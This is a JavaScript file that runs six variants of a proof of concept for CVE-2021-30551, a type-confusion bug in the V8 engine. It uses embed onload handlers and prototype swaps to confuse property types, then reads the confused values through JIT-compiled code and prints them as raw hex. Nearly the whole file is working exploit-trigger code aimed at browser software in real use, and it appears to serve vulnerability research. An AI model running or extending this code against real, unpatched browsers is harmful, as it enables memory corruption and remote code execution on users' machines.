// CVE-2021-30551 variants, testing which arrangement produces the confusion on
// v8 9.0. Baseline is the Project Zero RCA PoC. Each variant is isolated in its
// own scope, though the JIT state is shared across them by design — the ordering
// of variants therefore matters and is reported.
var print = (typeof print === 'function') ? print : function () { };

function hexOf(v) {
  var b = new ArrayBuffer(8), d = new Float64Array(b), u = new Uint32Array(b);
  d[0] = Number(v);
  return u[1].toString(16) + ':' + u[0].toString(16);
}

function buildPair(makeValue1, makeValue2, swap) {
  var global_object = {};
  var v1 = makeValue1();
  var v2 = makeValue2();
  var a = swap ? v2 : v1;
  var b = swap ? v1 : v2;

  function setVia(object, value, handler) {
    var embed = document.createElement('embed');
    embed.onload = handler;
    embed.type = 'text/html';
    Object.setPrototypeOf(global_object, embed);
    document.body.appendChild(embed);
    object.corrupted_prop = value;
    embed.remove();
  }

  var o1 = { __proto__: global_object };
  o1.regular_prop = 1;
  setVia(o1, b, function () {
    Object.setPrototypeOf(global_object, null);
    o1.corrupted_prop = a;
  });

  var o2 = { __proto__: global_object };
  o2.regular_prop = 1;
  setVia(o2, b, function () {
    Object.setPrototypeOf(global_object, null);
    o2.corrupted_prop = a;
    o1.regular_prop = 1.1;
  });

  return [o1, o2, a, b];
}

function run(name, o1, o2, warmBoth) {
  var jit = function (object) { return object.corrupted_prop[0]; };
  for (var i = 0; i < 100000; ++i) {
    jit(o1);
    if (warmBoth) { jit(o2); }
  }
  var out = [];
  [['o1', o1], ['o2', o2]].forEach(function (pair) {
    try {
      var v = jit(pair[1]);
      out.push(pair[0] + '=' + hexOf(v) + '/' + typeof v);
    } catch (e) { out.push(pair[0] + '=' + e.name); }
  });
  print('[+]' + name + ' ' + out.join(' ') +
        ' t1=' + typeof o1.corrupted_prop + ' t2=' + typeof o2.corrupted_prop);
}

// v1: RCA baseline — handler value is the array, outer value is a double.
var p = buildPair(function () { return [1.1]; }, function () { return 2261620.509803918; }, false);
run('v1-baseline', p[0], p[1], false);

// v2: swapped — handler value is the double, outer value is the array.
p = buildPair(function () { return [1.1]; }, function () { return 2261620.509803918; }, true);
run('v2-swapped', p[0], p[1], false);

// v3: baseline but warm the JIT on both objects.
p = buildPair(function () { return [1.1]; }, function () { return 2261620.509803918; }, false);
run('v3-warm-both', p[0], p[1], true);

// v4: baseline, then force the array back in by a plain store and re-read.
p = buildPair(function () { return [1.1]; }, function () { return 2261620.509803918; }, false);
p[1].corrupted_prop = [1.1, 2.2];
run('v4-restore', p[0], p[1], false);

// v5: grow the receiver's map inside the handler, so the transition created by
// the handler belongs to a superseded map and the search may miss.
function buildGrow(makeValue1, makeValue2) {
  var global_object = {};
  var v1 = makeValue1(), v2 = makeValue2();
  var o1 = { __proto__: global_object }; o1.regular_prop = 1;
  var o2 = { __proto__: global_object }; o2.regular_prop = 1;
  function setVia(object, value, handler) {
    var embed = document.createElement('embed');
    embed.onload = handler; embed.type = 'text/html';
    Object.setPrototypeOf(global_object, embed);
    document.body.appendChild(embed);
    object.corrupted_prop = value;
    embed.remove();
  }
  setVia(o1, v2, function () {
    Object.setPrototypeOf(global_object, null);
    o1.corrupted_prop = v1;
    o1.grow_a = 2; o1.grow_b = 3; o1.grow_c = 4;
  });
  setVia(o2, v2, function () {
    Object.setPrototypeOf(global_object, null);
    o2.corrupted_prop = v1;
    o1.regular_prop = 1.1;
  });
  return [o1, o2];
}
p = buildGrow(function () { return [1.1]; }, function () { return 2261620.509803918; });
run('v5-grow-map', p[0], p[1], false);

// v6: receiver forced to dictionary mode before the pair.
function buildDict() {
  var global_object = {};
  var v1 = [1.1], v2 = 2261620.509803918;
  var o1 = { __proto__: global_object }; o1.regular_prop = 1;
  var o2 = { __proto__: global_object }; o2.regular_prop = 1;
  for (var d = 0; d < 64; d++) { o1['pad' + d] = d; o2['pad' + d] = d; }
  function setVia(object, value, handler) {
    var embed = document.createElement('embed');
    embed.onload = handler; embed.type = 'text/html';
    Object.setPrototypeOf(global_object, embed);
    document.body.appendChild(embed);
    object.corrupted_prop = value;
    embed.remove();
  }
  setVia(o1, v2, function () {
    Object.setPrototypeOf(global_object, null);
    o1.corrupted_prop = v1;
  });
  setVia(o2, v2, function () {
    Object.setPrototypeOf(global_object, null);
    o2.corrupted_prop = v1;
    o1.regular_prop = 1.1;
  });
  return [o1, o2];
}
p = buildDict();
run('v6-dictionary', p[0], p[1], false);

print('[+]variants-done');
